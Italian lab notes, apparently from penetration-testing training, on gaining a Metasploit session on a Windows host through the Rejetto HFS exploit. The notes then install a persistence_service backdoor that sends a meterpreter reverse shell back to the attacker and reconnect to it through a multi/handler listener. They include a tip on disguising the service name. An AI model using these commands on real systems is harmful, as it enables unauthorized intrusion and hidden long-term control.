# Establishing Persistence On Windows

<figure><img src="../../../.gitbook/assets/image (12) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Accesso iniziale al sistema

```
service postgresql start && msfconsole
workspace -a Persistence
setg RHOSTS 10.2.19.11
db_nmap -sV 10.2.19.11
search rejetto
use windows/http/rejetto_hfs_exec
show options
set LHOST eth1
exploit
sysinfo
getuid
CTRL+Z
```

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Per poter stabilire persistenza sul sistema necessitiamo di un accesso come utente amministratore!

Quindi: prima privilege escalation e poi persistence
{% endhint %}

## Impostiamo la modalità per garantirci persistenza

```
search platform:windows persistence
use exploit/windows/local/persistence_service
set payload windows/x64/meterpreter/reverse_tcp
show options
// è possibile impostare SERVICE_NAME per camuffare il servizio con un nome non sospetto, oppure impostare anche REMOTE_EXE_PATH e REMOTE_EXE_NAME
set SESSION 1
// possiamo modificare LPORT. Non verrà creata automaticamente una sessione, 
// ma ci dà la possibilità di rimanere a disposizione per quando creeremo un handler su quella LPORT
run
set payload windows/meterpreter/reverse_tcp //perché supporta solo il staged payload a 32bit
exploit
getuid
exit
```

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Il modulo persistence va a inserire persistenza nel registro Windows, ma non possiamo farci affidamento perché sarebbe solo quando viene restartato.

Quindi quello che useremo è persistence\_service perché crea un servizio persistence sempre running che ci consente di connetterci quando vogliamo.

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Come fare per riavere accesso al target tramite persistenza

Se killiamo tutte le sessioni attualmente attive possiamo riaccedere al target usando un listener (multi/handler)

```
sessions
sessions -K //termina tutte le sessioni
use multi/handler
set payload windows/meterrpeter/reverse_tcp //lo stesso payload usato per creare la persistenza con il modulo persistence_service
show options
set LHOST eth1
set LPORT 4444 //la stessa porta usata per creare la persistenza
run
exit
run
sysinfo
getuid
```

<figure><img src="../../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Abbiamo quindi un servizio sempre attivo sul target che attende che apriamo un listener per poterci ricollegare con il sistema.

Ci sono altre tecniche per fare persistenza ma questa è la più stabile.

Funziona anche se chiudiamo tutto e usiamo un altro Metasploit Framework:

<figure><img src="../../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
